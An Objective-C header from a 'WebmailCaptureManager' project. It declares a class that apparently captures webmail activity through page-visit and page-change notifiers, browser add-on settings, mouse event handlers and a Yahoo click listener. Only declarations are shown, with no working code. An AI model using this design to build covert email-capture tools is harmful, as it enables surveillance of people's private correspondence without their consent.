//
//  WebmailNotifier.h
//  WebmailCaptureManager
//
//  Created by ophat on 2/6/15.
//  Copyright (c) 2015 ophat. All rights reserved.
//

#import <Foundation/Foundation.h>

#import "PageVisitedDelegate.h"

@class AsyncController, PageValueChangeNotifier, SpecialWebmailNotifier;

@interface WebmailNotifier : NSObject <PageVisitedDelegate> {
@private
    AsyncController *mAsyC;
    PageValueChangeNotifier *mPageNotifier;
    SpecialWebmailNotifier *mSpecialPageNotifier;
    NSOperationQueue *mQueue;
    
    NSString * mAddonName;
    NSString * mAddonPlist;
    
    id mMouseEventHandler;
    id mForceAliveMouseEventHandler;
}

@property (nonatomic, copy) NSString *mAddonName;
@property (nonatomic, copy) NSString *mAddonPlist;

@property (retain) id mMouseEventHandler;
@property (retain) id mForceAliveMouseEventHandler;

- (void) startCapture;
- (void) stopCapture;

- (void) registerYahooMouseClickListener;
- (void) unregisterYahooMouseClickListener;

@end
